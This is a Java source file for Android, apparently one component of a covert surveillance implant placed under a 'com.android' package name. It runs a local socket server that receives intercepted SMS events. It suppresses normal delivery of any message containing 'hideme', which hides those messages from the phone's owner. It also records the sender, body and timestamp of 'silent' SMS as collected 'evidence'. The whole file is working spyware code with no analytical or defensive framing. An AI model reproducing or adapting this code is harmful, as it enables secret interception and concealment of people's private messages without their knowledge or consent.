package com.android.dvci.util;
import android.net.LocalServerSocket;
import android.net.LocalSocket;
import android.net.LocalSocketAddress;
import android.telephony.SmsMessage;
import android.util.Log;
import com.android.dvci.auto.Cfg;
import com.android.dvci.evidence.EvidenceBuilder;
import com.android.dvci.evidence.EvidenceType;
import com.android.dvci.module.ModuleMessage;
import com.android.mm.M;
import java.io.BufferedInputStream;
import java.io.BufferedOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Date;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

/**
 * Created by zad on 27/02/15.
 */
public class LowEventHandler implements Runnable {

	private static final String TAG = "LowEventHandler";
	private boolean accept =true;
	private LocalServerSocket server = null;
	private final Thread thread;

	public LowEventHandler() {
		thread = new Thread(this);
		thread.start();
	}

	public static int dispatchNormalMessage(Object smsO) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " dispatchNormalMessage: start ok " + smsO);
		}
		int callOrig = 1;
		if (smsO == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: sms0 null ");
			}
			return callOrig;
		}

		try {
			byte[][] pdus = new byte[1][];
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: asking pdu ");
			}
			pdus[0] = Reflect.on(smsO).call("getPdu").get();
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: got it");
			}
			SmsMessage sms = SmsMessage.createFromPdu(pdus[0]);

			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " dispatchNormalMessage: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " dispatchNormalMessage:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: Exception:", e);
			}
		}
		return callOrig;
	}
	public static int dispatchNormalMessage(byte[] pdu) {

		int callOrig = 1;
		SmsMessage sms = SmsMessage.createFromPdu(pdu);

		if (Cfg.DEBUG) {
			Check.log(TAG + " dispatchNormalMessage: processing " + sms.getMessageBody());
		}
		if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage: Don't call origin ");
			}
			callOrig = 0;
		} else {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessage:  call origin");
			}
			callOrig = 1;

		}
		return callOrig;
	}
	public static int silentSmsPdu(LowEvent<byte[]> lsms) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " silentSmsPdu: start ok ");
		}
		int callOrig = 1;
		if (lsms.data.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " silentSmsPdu: pdus zero size ");
			}
			return callOrig;
		}

		try {
			final SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
			ScheduledExecutorService exec = Executors.newScheduledThreadPool(1);

			exec.schedule(new Runnable(){
				@Override
				public void run(){
					if (Cfg.DEBUG) {
						Check.log(TAG + "silentSmsPdu: saving evidence " + sms.getMessageBody());
					}
					String from, to;
					final String address = sms.getOriginatingAddress();
					final byte[] body = WChar.getBytes(sms.getMessageBody());
					final long date = sms.getTimestampMillis();
					final boolean sent = false;
					int flags;

					if (sent) {
						flags = 0;
						from = M.e("local"); //$NON-NLS-1$
						to = address;
					} else {
						flags = 1;
						to = M.e("local-silent"); //$NON-NLS-1$
						from = address;
					}

					final int additionalDataLen = 48;
					final byte[] additionalData = new byte[additionalDataLen];

					final DataBuffer databuffer = new DataBuffer(additionalData, 0, additionalDataLen);
					databuffer.writeInt(ModuleMessage.SMS_VERSION);
					databuffer.writeInt(flags);

					final DateTime filetime = new DateTime(new Date(date));
					databuffer.writeLong(filetime.getFiledate());
					databuffer.write(ByteArray.padByteArray(from.getBytes(), 16));
					databuffer.write(ByteArray.padByteArray(to.getBytes(), 16));
					EvidenceBuilder.atomic(EvidenceType.SMS_NEW, additionalData, body, new Date(date));

				}
			}, 1, TimeUnit.SECONDS);
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " silentSmsPdu: Exception:", e);
			}
		}
		return callOrig;
	}
	public static int dispatchNormalMessagePdu(LowEvent<byte[]> lsms) {

		if (Cfg.DEBUG) {
			Check.log(TAG + " dispatchNormalMessagePdu: start ok ");
		}
		int callOrig = 1;
		if (lsms.data.length==0) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessagePdu: pdus zero size ");
			}
			return callOrig;
		}

		try {
			SmsMessage sms = SmsMessage.createFromPdu(lsms.data);
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessagePdu: processing " + sms.getMessageBody());
			}
			if (sms.getMessageBody() != null && sms.getMessageBody().toLowerCase().contains("hideme")) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " dispatchNormalMessagePdu: Don't call origin ");
				}
				callOrig = 0;
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " dispatchNormalMessagePdu:  call origin");
				}
				callOrig = 1;

			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " dispatchNormalMessagePdu: Exception:", e);
			}
		}
		return callOrig;
	}

	private static LowEventHandlerDefs sendSerialObj(LowEventHandlerDefs obj) {
		if (obj==null){
			return null;
		}
		LocalSocket sender = new LocalSocket();
		obj.res=1;
		try {
			sender.connect(new LocalSocketAddress("llad"));
			if (Cfg.DEBUG) {
				Check.log(TAG + "SENT DATA ");
			}
			int timeout = 5;
			if (Cfg.DEBUG) {
				Check.log(TAG + "wait connection..");
			}
			while (timeout-- > 0) {
				if (sender.isBound() && sender.isConnected()) {
					break;
				} else {
					Log.d(TAG, ".");
				}
				Utils.sleep(100);
			}
			if (!(sender.isBound() && sender.isConnected())) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (connection failed): ");//$NON-NLS-1$
				}
				return obj;
			}
			DataInputStream streamIn = new DataInputStream(new
					BufferedInputStream(sender.getInputStream()));
			DataOutputStream streamOut = new DataOutputStream(new
					BufferedOutputStream(sender.getOutputStream()));
			ObjectOutputStream oos = new ObjectOutputStream(streamOut);
			oos.writeObject(obj);
			oos.flush();
			streamOut.flush();
			if (Cfg.DEBUG) {
				Check.log(TAG + " (object sent): ");//$NON-NLS-1$
			}
			obj = null;
			timeout = 10;
			int available = 0;
			while (timeout-- > 0 && available <= 0) {
				try {
					if (sender.isBound() && sender.isConnected()) {
						try {
							available = streamIn.available();
							if (Cfg.DEBUG) {
								Check.log(TAG + " (getAvailable): " + available);//$NON-NLS-1$
							}
							if (available > 0) {

								ObjectInputStream ois = new ObjectInputStream(streamIn);
								obj = (LowEventHandlerDefs) ois.readObject();
								if (Cfg.DEBUG) {
									Check.log(TAG + "GOT DATA " + obj);
								}
							}
						} catch (Exception e) {
							if (Cfg.DEBUG) {
								Check.log(TAG + " (is available) Error: ", e);//$NON-NLS-1$
							}
						}
					} else {
						if (Cfg.DEBUG) {
							Check.log(TAG + " (getAvailable) sender not connected");//$NON-NLS-1$
						}

					}

				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (getAvailable) Error: ", e);//$NON-NLS-1$
					}
				}
				Utils.sleep(100);
			}
			if (Cfg.DEBUG) {
				Check.log(TAG + " (exiting): t=" + timeout + " a=" + available);//$NON-NLS-1$
			}
			Utils.sleep(100);
		}catch (Exception e){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (LocalSocketAddress) Error: ", e);//$NON-NLS-1$
			}
		}
		return obj;
	}
	public void closeSocketServer() {
		accept = false;
		if ( thread != null ) {
			while (server != null) {
				thread.interrupt();
				Utils.sleep(100);
				if (server != null) {
					try {
						server.close();
					} catch (IOException e) {
						e.printStackTrace();
						continue;
					}
				}
				LowEventHandlerDefs obj = new LowEventHandlerDefs();
				obj.data = null;
				obj.type = LowEventHandlerDefs.EVENT_TYPE_KILL;
				obj = sendSerialObj(obj);
			}
		}
	}
	@Override
	public void run() {
		try {
			server = new LocalServerSocket("llad");
			if (Cfg.DEBUG) {
				Check.log(TAG + "Server is ready...");
			}
			while(this.accept) {
				/* wait until a connection is ready */
				try {
					LocalSocket receiver = server.accept();
					if (receiver != null) {
						DataInputStream streamIn = new DataInputStream(new
								BufferedInputStream(receiver.getInputStream()));
						DataOutputStream streamOut = new DataOutputStream(new
								BufferedOutputStream(receiver.getOutputStream()));
						int timeout = 5;
						while (streamIn.available() == 0 && timeout-- >= 0) {
							Utils.sleep(100);
						}
						if (streamIn.available() > 0) {
							ObjectInputStream ois = new ObjectInputStream(streamIn);
							LowEventHandlerDefs event = (LowEventHandlerDefs) ois.readObject();
							Log.d(TAG, "GOT DATA " + event);
							if (event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS || event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT) {
								if (event.data != null) {
									LowEvent<byte[]> sms_event = new LowEvent<byte[]>(event);
									if( event.type  == LowEventHandlerDefs.EVENT_TYPE_SMS_SILENT){
										event.res = silentSmsPdu(sms_event);
									}else {
										event.res = dispatchNormalMessagePdu(sms_event);
									}
								} else {
									event.res = 1;
								}
								if (Cfg.DEBUG) {
									Check.log(TAG + " SENT reply " + event);
								}
							} if(event.type == LowEventHandlerDefs.EVENT_TYPE_KILL) {
								if (Cfg.DEBUG) {
									Check.log(TAG + " SENT Kill");
									event.res = 1;
								}
							}else{
								event.res = 1;
							}
							timeout = 10;
							while (timeout-- >= 0 ) {
									try {
										ObjectOutputStream oos = new ObjectOutputStream(streamOut);
										oos.writeObject(event);
										oos.flush();
										oos.close();
										break;
									} catch (Exception e) {
										if (Cfg.DEBUG) {
											Check.log(TAG + "run: Exception sending back:", e);
										}
									}
								Utils.sleep(100);
							}
						}
						receiver.close();
						if (Cfg.DEBUG) {
							Check.log(TAG + "run: receiver closed");
						}
					}
				} catch (Exception e) {
					if (Cfg.DEBUG) {
						Check.log(TAG + "run: Exception:", e);
					}
				}
			}
			server.close();
			server = null;
		} catch (IOException ex) {
			if (Cfg.DEBUG) {
				Check.log(TAG + "IOEXCEPTION", ex);
			}
		}
	}
}
